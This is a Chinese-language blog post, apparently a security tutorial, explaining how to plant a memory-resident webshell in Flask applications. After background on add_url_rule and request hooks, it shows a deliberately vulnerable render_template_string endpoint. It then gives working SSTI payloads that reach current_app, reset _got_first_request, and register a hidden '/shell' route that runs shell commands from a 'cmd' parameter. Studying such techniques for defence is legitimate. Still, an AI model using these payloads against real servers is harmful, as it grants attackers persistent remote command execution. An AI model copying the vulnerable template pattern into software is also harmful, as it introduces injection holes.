<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Python中的内存马 | 阿巴</title><meta name="author" content="阿巴"><meta name="copyright" content="阿巴"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Python中的内存马Flask中的内存马基础知识要想在flask中实现内存马，只有两种方法：  实现动态注册路由 在请求的前后拦截路由  我们来解释下这两种方法的含义 动态注册路由动态注册路由，指在程序运行当中可以按需要注册路由，常用的方法如下： @app.route() app.add_url_rule url_for  这三个函数都能动态注册路由，举几个例子： app.route ：参数如下">
<meta property="og:type" content="article">
<meta property="og:title" content="Python中的内存马">
<meta property="og:url" content="http://example.com/2024/09/18/Python%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="阿巴">
<meta property="og:description" content="Python中的内存马Flask中的内存马基础知识要想在flask中实现内存马，只有两种方法：  实现动态注册路由 在请求的前后拦截路由  我们来解释下这两种方法的含义 动态注册路由动态注册路由，指在程序运行当中可以按需要注册路由，常用的方法如下： @app.route() app.add_url_rule url_for  这三个函数都能动态注册路由，举几个例子： app.route ：参数如下">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
<meta property="article:published_time" content="2024-09-17T16:00:00.000Z">
<meta property="article:modified_time" content="2024-09-18T07:00:38.540Z">
<meta property="article:author" content="阿巴">
<meta property="article:tag" content="Python">
<meta property="article:tag" content="内存马">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2024/09/18/Python%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E9%A9%AC/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Error',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Python中的内存马',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-09-18 15:00:38'
}</script><script>(win=>{
      win.saveToLocal = {
        set: (key, value, ttl) => {
          if (ttl === 0) return
          const now = Date.now()
          const expiry = now + ttl * 86400000
          const item = {
            value,
            expiry
          }
          localStorage.setItem(key, JSON.stringify(item))
        },
      
        get: key => {
          const itemStr = localStorage.getItem(key)
      
          if (!itemStr) {
            return undefined
          }
          const item = JSON.parse(itemStr)
          const now = Date.now()
      
          if (now > item.expiry) {
            localStorage.removeItem(key)
            return undefined
          }
          return item.value
        }
      }
    
      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        script.onerror = reject
        script.onload = script.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          script.onload = script.onreadystatechange = null
          resolve()
        }

        Object.keys(attr).forEach(key => {
          script.setAttribute(key, attr[key])
        })

        document.head.appendChild(script)
      })
    
      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onerror = reject
        link.onload = link.onreadystatechange = function() {
          const loadState = this.readyState
          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
          link.onload = link.onreadystatechange = null
          resolve()
        }
        document.head.appendChild(link)
      })
    
      win.activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
        if (t === 'dark') activateDarkMode()
        else if (t === 'light') activateLightMode()
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
      const detectApple = () => {
        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
          document.documentElement.classList.add('apple')
        }
      }
      detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">65</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="阿巴"><span class="site-name">阿巴</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Python中的内存马</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-09-17T16:00:00.000Z" title="Created 2024-09-18 00:00:00">2024-09-18</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2024-09-18T07:00:38.540Z" title="Updated 2024-09-18 15:00:38">2024-09-18</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%8A%80%E6%9C%AF/">技术</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="Python中的内存马"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="Python中的内存马"><a href="#Python中的内存马" class="headerlink" title="Python中的内存马"></a>Python中的内存马</h1><h2 id="Flask中的内存马"><a href="#Flask中的内存马" class="headerlink" title="Flask中的内存马"></a>Flask中的内存马</h2><h3 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h3><p>要想在flask中实现内存马，只有两种方法：</p>
<ul>
<li>实现动态注册路由</li>
<li>在请求的前后拦截路由</li>
</ul>
<p>我们来解释下这两种方法的含义</p>
<h4 id="动态注册路由"><a href="#动态注册路由" class="headerlink" title="动态注册路由"></a>动态注册路由</h4><p>动态注册路由，指在程序运行当中可以按需要注册路由，常用的方法如下：</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
app<span class="token punctuation">.</span>add_url_rule
url_for<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>这三个函数都能动态注册路由，举几个例子：</p>
<p><code>app.route</code> ：参数如下</p>
<p><strong>rule</strong>:</p>
<ul>
<li>URL 路径规则，可以包含动态部分。</li>
<li>例如：<code>&#39;/user/&lt;username&gt;&#39;</code></li>
</ul>
<p><strong>endpoint</strong>:</p>
<ul>
<li>端点名称，默认为视图函数的名称。</li>
<li>例如：<code>&#39;show_user_profile&#39;</code></li>
</ul>
<p><strong>methods</strong>:</p>
<ul>
<li>允许的 HTTP 方法列表。</li>
<li>例如：<code>[&#39;GET&#39;, &#39;POST&#39;]</code></li>
</ul>
<p><strong>defaults</strong>:</p>
<ul>
<li>URL 参数的默认值。</li>
<li>例如：<code>defaults=&#123;&#39;username&#39;: &#39;guest&#39;&#125;</code></li>
</ul>
<p><strong>strict_slashes</strong>:</p>
<ul>
<li>指定是否严格匹配斜杠结尾。</li>
<li>例如：<code>strict_slashes=False</code></li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    person <span class="token operator">=</span> <span class="token string">'knave'</span>
    <span class="token keyword">if</span> <span class="token string">'name'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>
        person <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
    template <span class="token operator">=</span> <span class="token string">'&lt;h1>Hi, %s.&lt;/h1>'</span> <span class="token operator">%</span> person

    <span class="token keyword">return</span> render_template_string<span class="token punctuation">(</span>template<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>add_url_rule</code> ：参数如下</p>
<ul>
<li><p><strong>rule</strong>：</p>
<ul>
<li>URL 路径规则。</li>
<li>示例：<code>app.add_url_rule(&#39;/user/&lt;username&gt;&#39;, &#39;profile&#39;, profile)</code></li>
</ul>
<p><strong>endpoint</strong>：</p>
<ul>
<li>端点名称，默认是视图函数名称。</li>
<li>示例：<code>app.add_url_rule(&#39;/test&#39;, &#39;test_endpoint&#39;, test)</code></li>
</ul>
<p><strong>view_func</strong>：</p>
<ul>
<li>处理请求的视图函数。</li>
<li>示例：<code>app.add_url_rule(&#39;/&#39;, &#39;index&#39;, index)</code></li>
</ul>
<p><strong>methods</strong>：</p>
<ul>
<li>允许的 HTTP 方法。</li>
<li>示例：<code>app.add_url_rule(&#39;/submit&#39;, &#39;submit&#39;, submit, methods=[&#39;POST&#39;])</code></li>
</ul>
<p><strong>defaults</strong>：</p>
<ul>
<li>URL 参数的默认值。</li>
<li>示例：<code>app.add_url_rule(&#39;/user/&lt;username&gt;&#39;, &#39;profile&#39;, profile, defaults=&#123;&#39;username&#39;: &#39;guest&#39;&#125;)</code></li>
</ul>
<p><strong>subdomain</strong>：</p>
<ul>
<li>指定子域名。</li>
<li>示例：<code>app.add_url_rule(&#39;/sub&#39;, &#39;sub_page&#39;, sub_page, subdomain=&#39;admin&#39;)</code></li>
</ul>
<p><strong>strict_slashes</strong>：</p>
<ul>
<li>是否严格匹配斜杠结尾，默认为 <code>None</code>。</li>
<li>示例：<code>app.add_url_rule(&#39;/noslash&#39;, &#39;no_slash&#39;, no_slash, strict_slashes=False)</code></li>
</ul>
<p><strong>provide_automatic_options</strong>：</p>
<ul>
<li>是否自动生成 <code>OPTIONS</code> 响应，默认为 <code>True</code>。</li>
<li>示例：<code>app.add_url_rule(&#39;/custom_options&#39;, &#39;custom_options&#39;, custom_options_handler, provide_automatic_options=False)</code></li>
</ul>
</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'This is a test route'</span>

app<span class="token punctuation">.</span>add_url_rule<span class="token punctuation">(</span><span class="token string">'/test'</span><span class="token punctuation">,</span> <span class="token string">'test'</span><span class="token punctuation">,</span> test<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>url_for</code> :参数如下</p>
<p><strong>endpoint</strong>：</p>
<ul>
<li>视图函数的名称。</li>
<li>示例：<code>url_for(&#39;index&#39;)</code></li>
</ul>
<p><strong>values</strong>：</p>
<ul>
<li>动态路径变量的字典。</li>
<li>示例：<code>url_for(&#39;profile&#39;, username=&#39;john&#39;)</code></li>
</ul>
<p><strong>_external</strong>：</p>
<ul>
<li>生成绝对 URL，默认为 <code>False</code>。</li>
<li>示例：<code>url_for(&#39;index&#39;, _external=True)</code></li>
</ul>
<p><strong>_scheme</strong>：</p>
<ul>
<li>指定 URL 的方案（如 <code>http</code> 或 <code>https</code>），仅当 <code>_external</code> 为 <code>True</code> 时有效。</li>
<li>示例：<code>url_for(&#39;index&#39;, _external=True, _scheme=&#39;https&#39;)</code></li>
</ul>
<p><strong>_anchor</strong>：</p>
<ul>
<li>URL 的锚点部分。</li>
<li>示例：<code>url_for(&#39;index&#39;, _anchor=&#39;section1&#39;)</code></li>
</ul>
<p><strong>_method</strong>：</p>
<ul>
<li>针对特定 HTTP 方法的 URL。</li>
<li>示例：<code>url_for(&#39;submit&#39;, _method=&#39;POST&#39;)</code></li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/test"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"test"</span>
<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">app</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">"&lt;a href="</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> url_for<span class="token punctuation">(</span><span class="token string">'test'</span><span class="token punctuation">,</span> name<span class="token operator">=</span><span class="token string">'123'</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token string">">&lt;/a>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>前两者都能在不存在路由的情况下进行任意创建，但url_for函数与其不同，在创建的时候，需要存在对应的路由，才能正确创建，否则会抛出一个<code>BuildError</code>错误。</p>
<p>并且，装饰器@app.route在底层上是调用add_url_rule来实现对新路由的创建的，路径为flask.sansio.scaffold.Scaffold，</p>
<p><img src="D:/Git/Git/myblog/source/images/python%E5%86%85%E5%AD%98%E9%A9%AC/app.route%E7%9A%84%E5%BA%95%E5%B1%82%E8%B0%83%E7%94%A8.png"></p>
<h4 id="在请求的前后拦截路由"><a href="#在请求的前后拦截路由" class="headerlink" title="在请求的前后拦截路由"></a>在请求的前后拦截路由</h4><p>“拦截路由” 通常指的是在处理请求之前或之后执行一些额外的逻辑。这种拦截机制通常被称为“中间件”或“钩子”，举个简单例子</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>before_request</span>
<span class="token keyword">def</span> <span class="token function">before_request_func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token comment"># 在这里添加你想在每次请求之前执行的代码</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"在每次请求之前都会执行这个函数"</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'Hello, World!'</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Flask中可以拦截路由的装饰器或者钩子函数</p>
<ul>
<li>template_filter() 装饰器：用于注册一个模板过滤器，这个过滤器可以在Jinja2模板中使用。</li>
<li>template_global() 装饰器：于注册一个全局模板变量或函数，使其在所有模板中都可以使用。</li>
<li>template_test() 装饰器：用于注册一个模板测试，测试可以在模板条件中使用。</li>
<li>add_template_filter() 装饰器：用于动态添加模板过滤器，与 template_filter() 装饰器功能相同，但更灵活。</li>
<li>add_template_global() 装饰器：用于动态添加全局模板变量或函数，与 template_global() 装饰器功能相同。</li>
<li>add_template_test() 装饰器：用于动态添加模板测试，与 template_test() 装饰器功能相同。</li>
<li>endpoint() 装饰器：用于指定视图函数的端点名称。端点是路由和视图函数的唯一标识符。</li>
<li>errorhandler() 装饰器：用于注册一个错误处理函数，当特定的HTTP错误发生时调用。</li>
<li>after_request() 装饰器：用于注册一个函数，该函数会在每次请求之后调用，通常用于修改响应对象。</li>
<li>before_request() 装饰器：用于注册一个函数，该函数会在每次请求之前执行。</li>
<li>teardown_request() 装饰器：用于注册一个函数，该函数会在每次请求结束后调用，无论请求是否成功。</li>
<li>context_processor() 装饰器：用于注册一个上下文处理器，该处理器返回的字典将合并到模板上下文中。</li>
<li>url_value_preprocessor() 装饰器：用于注册一个函数，该函数会在请求解析URL参数之前调用，可以用于预处理URL参数。</li>
<li>url_defaults() 装饰器：用于注册一个函数，该函数会在构建URL时调用，通常用于设置URL的默认值。</li>
</ul>
<p>我们随便进入一个装饰器对应的 Flask 应用实例上的方法，跟到最后都可以发现基本上都是对其对应的数据结构进行操作，比如使用装饰器的时候会向结构体里添加一条，请求的时候遍历获取到对应装饰器的函数然后调用。这个数据结构的类型是<code>collections.defaultdict</code>，我们在注入内存马的时候就不需要调用函数，而是直接修改这个数据结构的内容。<br>下面的方法中，有的是可以针对蓝图来进行的。</p>
<h3 id="构造内存马"><a href="#构造内存马" class="headerlink" title="构造内存马"></a>构造内存马</h3><p>在构造内存马之前，我们先来看一下匿名函数</p>
<h4 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h4><p>这是一种简单的构造函数的方法，不需要def关键字来进行标识，语法格式如下：</p>
<p><strong>lambda 语法格式：</strong></p>
<pre class="line-numbers language-none"><code class="language-none">lambda arguments: expression<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<ul>
<li><code>lambda</code>是 Python 的关键字，用于定义 lambda 函数。</li>
<li><code>arguments</code> 是参数列表，可以包含零个或多个参数，但必须在冒号(<code>:</code>)前指定。</li>
<li><code>expression</code> 是一个表达式，用于计算并返回函数的结果。</li>
</ul>
<p>举个简单的例子</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">f <span class="token operator">=</span> <span class="token keyword">lambda</span><span class="token punctuation">:</span> <span class="token string">"Hello, world!"</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>f<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 输出: Hello, world!</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>这时就会输出”Hello, world!”，其余详细用法见：<a target="_blank" rel="noopener" href="https://www.runoob.com/python3/python-lambda.html">https://www.runoob.com/python3/python-lambda.html</a></p>
<p>在上面说过了，我们要想实现python的内存马，要么实现动态路由的注册，要么实现请求前后路由的拦截，这两者实现我们都需要匿名函数的辅助才能实现内存马的功能</p>
<h4 id="利用动态路由创建实现内存马"><a href="#利用动态路由创建实现内存马" class="headerlink" title="利用动态路由创建实现内存马"></a>利用动态路由创建实现内存马</h4><p>上面说过了，@app.route装饰器是利用app.add_url_rule来实现动态路由的创建，我们直接利用exec方法通过其创建一个路由。</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"app.add_url_rule('/shell1', 'shell1', lambda: '123');"</span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC1.png"></p>
<p>成功执行，创建了shell1路由，我们起一个简单的ssti环境尝试一下</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'POST'</span><span class="token punctuation">,</span> <span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    person <span class="token operator">=</span> <span class="token string">'knave'</span>
    <span class="token keyword">if</span> <span class="token string">'name'</span> <span class="token keyword">in</span> request<span class="token punctuation">.</span>form<span class="token punctuation">:</span>
        person <span class="token operator">=</span> request<span class="token punctuation">.</span>form<span class="token punctuation">[</span><span class="token string">'name'</span><span class="token punctuation">]</span>
    template <span class="token operator">=</span> <span class="token string">'&lt;h5>Hi, %s.&lt;/h5>'</span> <span class="token operator">%</span> person<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>随便找一个能打通的任意代码执行的payload</p>
<pre class="line-numbers language-none"><code class="language-none">[].__class__.__base__.__subclasses__()[219].__init__.__globals__[&#39;__builtins__&#39;].eval(&quot;__import__(&#39;os&#39;).popen(&#39;id&#39;).read()&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC2.png"></p>
<p>很好，成功执行，我们将上面的代码放进去命令执行的位置</p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC3.png"></p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC4-1721809294664-10.png"></p>
<p>直接就报错了，仔细一看，原来是app未找到，所以导致了错误，但我上面明明存在<code>app=Flask(__name__)</code>这段代码啊，为什么会报错呢，这个时候就不得不提起flask的一个性质，上下文隔离</p>
<h5 id="上下文隔离"><a href="#上下文隔离" class="headerlink" title="上下文隔离"></a>上下文隔离</h5><p>在python的flask中分为请求上下文和应用上下文</p>
<ul>
<li>请求上下文：Flask从客户端收到请求时，要让视图函数能访问一些对象，这样才能处理请求，要想让视图函数能够访问请求对象，一个显而易见的方式是将其作为参数传入视图函数，不过这会导致程序中的每个视图函数都增加一个参数，除了访问请求对象,如果视图函数在处理请求时还要访问其他对象，情况会变得更糟。为了避免大量可有可无的参数把视图函数弄得一团糟，Flask使用上下文临时把某些对象变为全局可访问，这就是一种重构设计思路。</li>
<li>应用上下文：应用程序上下文,用于存储应用程序中的变量<ul>
<li>current_app 存储应用配置，数据库连接等应用相关信息</li>
<li>g变量 作为flask程序全局的一个临时变量， 充当者中间媒介的作用,我们可以通过它传递一些数据，g保存的是当前请求的全局变量，不同的请求会有不同的全局变量，通过不同的thread id区别。</li>
</ul>
</li>
</ul>
<p>我们在请求中用app.add_url_rule中的app，虽然在代码最初时我们实例化的Flask对象，但由于上下文隔离的原因，我们从客户端的请求无法访问到，所以我们如果要通过我们已经实例化的Flask对象来创建一个新路由的话，我们就需要获取当前已经实例化的对象，再通过这个对象来实现创建新路由。</p>
<p>在上面提到了在current_app中存储了应用配置，所以现在我们获取这个对像，这个对象通常是flask相关类中存在的，在我电脑上测试时在<code>flask.cli.ScriptInfo</code>类中找到的:</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">668</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">eval</span><span class="token punctuation">(</span><span class="token string">"app.add_url_rule('/shell', 'shell', lambda: '123')"</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span><span class="token string">'app'</span><span class="token punctuation">:</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">668</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>然后，新的问题又来了，他不出意外的又报错了：</p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC5.png"></p>
<p>这个报错的意思是我们的这个add_url_rule这个方法中只能应用在处理第一个请求之前调用，一旦应用开始处理请求，再调用这些方法会导致不一致性和错误。也就是说，所有的路由和其他设置必须在应用启动和处理请求之前完成。我本来想调试，但这个调试有点怪，我直接调试和正常运行的报错结果不一样，所以我们开启flask的debug来看看详细的报错</p>
<p>然后在&#x2F;Lib&#x2F;site-packages&#x2F;flask&#x2F;sansio&#x2F;app.py中找到了这个</p>
<p><img src="/./../../../source/images/%E6%9E%84%E9%80%A0%E5%86%85%E5%AD%98%E9%A9%AC6.png"></p>
<p>可以看到函数只判断了下_got_first_request的值，那么现在我们能访问到应用上下文，所以我们直接在add_url_rule前修改值，再在我们添加完路由之后，再修改回来</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">668</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'__builtins__'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token keyword">exec</span><span class="token punctuation">(</span><span class="token string">"app._got_first_request=False;app.add_url_rule('/shell', 'shell', lambda: '&lt;pre>&#123;0&#125;&lt;/pre>'.format(__import__('os').popen(request.args.get('cmd')).read()));app._got_first_request = True"</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span><span class="token string">'app'</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__base__<span class="token punctuation">.</span>__subclasses__<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">668</span><span class="token punctuation">]</span><span class="token punctuation">.</span>__init__<span class="token punctuation">.</span>__globals__<span class="token punctuation">[</span><span class="token string">'current_app'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

